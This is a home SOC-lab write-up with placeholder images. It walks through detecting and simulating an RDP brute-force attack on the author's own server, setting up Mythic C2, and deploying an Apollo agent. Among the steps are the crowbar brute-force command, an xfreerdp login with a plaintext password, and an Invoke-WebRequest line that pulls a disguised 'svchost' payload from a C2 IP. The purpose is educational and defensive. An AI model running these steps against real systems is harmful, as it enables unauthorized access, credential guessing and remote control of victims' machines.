# Week 3: Brute Force RDP Attack Simulation and Mythic C2 Setup

## Steps

### 1. Finding Exposed RDP Servers
- **Using Shodan**: Search for servers with exposed RDP on the default port.
  ![Shodan Search]() 
- **Using Censys**: Perform the same search to verify results.
  ![Censys Search](link_to_your_image) 

### 2. Monitoring Failed RDP Attempts
- Created a log query for failed RDP attempts and confirmed my own failed login.
  ![Failed RDP Log Query](link_to_your_image) <!-- Replace with actual image link -->
- Generated alerts similar to earlier SSH queries.
  ![Alert Generation](link_to_your_image) <!-- Replace with actual image link -->
- Executed a brute force attack on my Windows server to generate an alert.
  ![Brute Force Alert](link_to_your_image) <!-- Replace with actual image link -->

### 3. Configuring Detection Rules
- **Detection Rule Setup**:
    - Current rules only query thresholds; need to create detection rules under **Security**.
      ![Detection Rule Setup](link_to_your_image) <!-- Replace with actual image link -->
    - Opted for preconfigured rules or created a new one to experiment.
      ![Preconfigured Rules](link_to_your_image) <!-- Replace with actual image link -->
    - Configured data involved in the new rules, mirroring the process used for SSH attempts.
      ![Configuring New Rules](link_to_your_image) <!-- Replace with actual image link -->

### 4. Data Visualization
- Created maps for new RDP data queries (following SSH attempt mapping steps).
  ![RDP Data Map](link_to_your_image) <!-- Replace with actual image link -->
- Developed tables for dashboard visualization:
    - **Failed and Successful SSH Attempts** to the exposed Ubuntu server.
      ![SSH Attempts Visualization](link_to_your_image) <!-- Replace with actual image link -->
    - **RDP Activity Tracking** on the exposed Windows server.
      ![RDP Activity Table](link_to_your_image) <!-- Replace with actual image link -->

### 5. Attack Diagram Creation
- Created an attack diagram outlining the threat actor's process.
  ![Attack Diagram](link_to_your_image) <!-- Replace with actual image link -->

### 6. Setting Up Mythic C2
- **Spin Up Ubuntu Server**:
    ```bash
    sudo apt install docker-compose
    sudo apt install make
    git clone https://github.com/its-a-feature/mythic
    cd mythic
    docker-compose up -d
    sudo systemctl restart docker
    ```
  ![Ubuntu Server Setup](link_to_your_image) <!-- Replace with actual image link -->
- Verified Docker status before restarting the service.
  ![Docker Status](link_to_your_image) <!-- Replace with actual image link -->

### 7. Starting Mythic
- Run the following command to start Mythic:
    ```bash
    make
    ./mythic-cli start
    ```
  ![Starting Mythic](link_to_your_image) <!-- Replace with actual image link -->

### 8. Configuring Mythic
- Tightened firewall rules, allowing exceptions for Windows and Ubuntu servers.
  ![Firewall Configuration](link_to_your_image) <!-- Replace with actual image link -->
- Accessed Mythic web GUI:
    - Default user: `mythic_admin`
    - Find password with:
        ```bash
        cat .env | grep -i admin_password
        ```
  ![Mythic GUI Login](link_to_your_image) <!-- Replace with actual image link -->

### 9. Preparing for the Attack
- Created a target file on the Windows VM with admin password.
  ![Target File Creation](link_to_your_image) <!-- Replace with actual image link -->
- Moved to Kali Linux's wordlists directory and prepared `rockyou.txt`:
    ```bash
    gunzip rockyou.txt.gz
    head -n 50 rockyou.txt > ~/Documents/top_50_words.txt
    ```
  ![Preparing Wordlists](link_to_your_image) <!-- Replace with actual image link -->

### 10. Brute Force with Crowbar
- Added the Windows password to the wordlist for easier access.
  ![Wordlist Modification](link_to_your_image) <!-- Replace with actual image link -->
- Installed Crowbar:
    ```bash
    sudo apt-get install -y crowbar
    ```
  ![Crowbar Installation](link_to_your_image) <!-- Replace with actual image link -->
- **Target File Setup**: 
    - Created `target.txt` containing the public IP and username:
      ```
      155.138.220.109 Administrator
      ```
  ![Target File Setup](link_to_your_image) <!-- Replace with actual image link -->

- **Brute Force Command**:
    ```bash
    crowbar -b RDP -u Administrator -C top_50_words.txt -s 155.138.220.109
    ```
  ![Brute Force Command](link_to_your_image) <!-- Replace with actual image link -->

### 11. RDP Session Access
- Used `xfreerdp` to access the RDP session:
    ```bash
    xfreerdp /u:Administrator /p:Winter2024! /v:155.138.220.109
    ```
  ![Accessing RDP Session](link_to_your_image) <!-- Replace with actual image link -->
- Executed commands for intelligence gathering:
    ```bash
    whoami
    ipconfig
    net user
    net group
    ```
  ![Command Execution](link_to_your_image) <!-- Replace with actual image link -->

### 12. Downloading and Executing Payload
- SSH into Mythic server and download agent:
    ```bash
    ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
    ```
  ![Mythic Agent Download](link_to_your_image) <!-- Replace with actual image link -->

- Install HTTP profile:
    ```bash
    ./mythic-cli install github https://github.com/MythicC2Profiles/http
    ```
  ![HTTP Profile Installation](link_to_your_image) <!-- Replace with actual image link -->

- Created payload:
    - Ensured it calls back to the C2 server's public IP.
    - Downloaded the payload using:
    ```bash
    Invoke-WebRequest -Uri http://45.76.248.184:9999/svchost-SOC-Project.exe -OutFile "C:\Users\Public\Downloads\svchost-SOC-Project.exe"
    ```
  ![Payload Creation](link_to_your_image) <!-- Replace with actual image link -->

### 13. Finalizing the Attack
- Allowed HTTP connection on firewall:
    ```bash
    ufw allow 80
    ```
  ![Allowing HTTP Connection](link_to_your_image) <!-- Replace with actual image link -->
- Ran the payload on the Windows server.
  ![Payload Execution](link_to_your_image) <!-- Replace with actual image link -->
- Monitored Mythic GUI for established session and confirmed successful file extraction from the agent.
  ![Mythic GUI Session](link_to_your_image) <!-- Replace with actual image link -->

## Conclusion
This week focused on simulating a brute force RDP attack while setting up the Mythic C2 server. Key tasks included finding exposed RDP servers, configuring detection rules, and creating payloads for further exploitation.
